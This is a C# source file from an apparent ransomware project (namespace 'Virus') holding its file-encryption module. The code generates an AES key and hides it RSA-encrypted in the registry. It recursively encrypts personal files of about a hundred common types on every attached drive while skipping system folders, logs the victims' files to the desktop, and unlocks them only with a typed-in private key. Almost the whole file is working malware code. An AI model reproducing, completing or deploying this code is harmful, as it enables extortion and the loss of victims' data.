using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using static Virus.RegHelpers;
using static Virus.Form2;
using System.Linq;

namespace Virus
{
    class AESencryption
    {
        //Vairables
        private static string _encryptedExtension = ".encrypt";
        public static char[] _aesKey;  //generate random key
        private static bool _DeleteAfterDecrypt = true;
        private static bool _DeleteAfterEncrypt = false;

        public static string instructionstxt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\INSTRUCTIONS.txt";
        public static string encrypttxt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\ENCRYPTED.txt";
        public static string decryptexe = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\DECRYPT.EXE";

        public static int _encryptedFileCount = 0;
        private static UnicodeEncoding _encoder = new UnicodeEncoding();

        /// <summary>
        /// Generates Random String Used As AES Password To Encrypt And Decrypt Files
        /// </summary>
        /// <param name="length"></param>
        /// <param name="chars"></param>
        /// <returns></returns>
        public static char[] GenerateRandomCharArray(int length, string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_")
        {
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                byte[] data = new byte[length];

                // If chars.Length isn't a power of 2 then there is a bias if we simply use the modulus operator. The first characters of chars will be more probable than the last ones.
                // buffer used if we encounter an unusable random byte. We will regenerate it in this buffer
                byte[] buffer = null;

                // Maximum random number that can be used without introducing a bias
                int maxRandom = byte.MaxValue - ((byte.MaxValue + 1) % chars.Length);

                crypto.GetBytes(data);

                char[] result = new char[length];

                for (int i = 0; i < length; i++)
                {
                    byte value = data[i];

                    while (value > maxRandom)
                    {
                        if (buffer == null)
                        {
                            buffer = new byte[1];
                        }

                        crypto.GetBytes(buffer);
                        value = buffer[0];
                    }

                    result[i] = chars[value % chars.Length];
                }

                return result;
            }
        }

        /// <summary>
        /// Creates a random salt that will be used to encrypt your file. This method is required on FileEncrypt.
        /// </summary>
        /// <returns></returns>
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        /// <summary>
        /// Encrypts a file from its path using a random string.
        /// </summary>
        /// <param name="inputFile"></param>
        /// <param name="password"></param>
        private static void FileEncrypt(string inputFile, char[] password)
        {
            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + _encryptedExtension, FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                File.AppendAllText(encrypttxt, $"\n{inputFile}");
                cs.Close();
                fsCrypt.Close();
                if(_DeleteAfterEncrypt == true)
                {
                    File.Delete(inputFile);
                }
            }
        }

        /// <summary>
        /// Decrypts an encrypted file with the FileEncrypt method through its path and the plain password.
        /// </summary>
        /// <param name="inputFile"></param>
        /// <param name="outputFile"></param>
        /// <param name="password"></param>
        private static void FileDecrypt(string inputFile, char[] password)
        {

            string outputFile = inputFile.Replace(_encryptedExtension, "");
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            //AES.Padding = PaddingMode.PKCS7; original
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CFB;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    fsOut.Write(buffer, 0, read);

                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();

                if(_DeleteAfterDecrypt == true)
                {
                    File.Delete(inputFile);
                }
            }
        }

        //STILL IN DEVELOPMENT
        private static readonly string[] extensionsToEncrypt = { "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite", "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd", "wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf", "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay", "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob", "wmv" }; //files to decrypt

        /// <summary>
        /// Returns DriveInfo[] of all attached drives.
        /// </summary>
        /// <returns></returns>
        private static DriveInfo[] GetAttachedDrives()
        {
            return System.IO.DriveInfo.GetDrives();
        }

        /// <summary>
        /// Function to encrypt and decrpyt directories.
        /// </summary>
        /// <param name="targetDirectory"></param>
        /// <param name="aesKey"></param>
        /// <param name="encrypt">true if you want to encrypt, false if you want to decrypt</param>
        private static void EncryptOrDecryptDirectory(string targetDirectory, char[] aesKey, bool encrypt)
        {
            // Process the list of files found in the directory.
            var fileEntries = Directory.EnumerateFiles(targetDirectory, "*.*").Where(file => extensionsToEncrypt.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase) && !file.Contains(_encryptedExtension) && x != encrypttxt && x != instructionstxt ));
            foreach (string fileName in fileEntries)
            {
                try
                {
                    
                    if (encrypt == false)
                    {
                        //Debug.WriteLine($"Would have decrypted {fileName}");
                        FileDecrypt(fileName, aesKey);
                        

                    }
                    else if (encrypt == true)
                    {
                        //Debug.WriteLine($"Would have encrypted {fileName}");
                        FileEncrypt(fileName, aesKey);
                        File.AppendAllText(encrypttxt, fileName);
                        Debug.WriteLine(_encryptedFileCount++);

                    }
                }
                catch (System.Exception excpt)
                {
                    Console.WriteLine(excpt.Message);
                }
            }

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
                try
                {   //Dont go into windows program files and temporary internet files. And other #ew ugly
                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\"))
                    {
                        EncryptOrDecryptDirectory(subdirectory, aesKey, encrypt);
                    }

                }
                catch (System.Exception excpt)
                {
                    Console.WriteLine(excpt.Message);
                }
        }
        public static void StartEncryption()
        {
            if (_aesKey == null)
            {
                _aesKey = GenerateRandomCharArray(32); //Created
                SetInSecret(RSAencryption.Encrypt(_aesKey), AESFinder); //encrypt the aes key using rsa store in registry
            }   //gets aes key

            DriveInfo[] myDrives = GetAttachedDrives();
            foreach (DriveInfo drive in myDrives)
            {
                EncryptOrDecryptDirectory(drive.Name, _aesKey, true);
            }


            for (int i = 0; i < _aesKey.Length; i++)    //blanks out char array
            {
                _aesKey[i] = '\0';
            }
            ThawMouse();
        }
        public static void StartDecryption(string privkeytypedin)
        {
            FreezeMouse();
            _aesKey = RSAencryption.Decrypt(GetFromSecret(AESFinder), privkeytypedin);

            DriveInfo[] myDrives = GetAttachedDrives();
            foreach (DriveInfo drive in myDrives)
            {
                EncryptOrDecryptDirectory(drive.Name, _aesKey, false);
            }
            ThawMouse();
        }

    } 
}







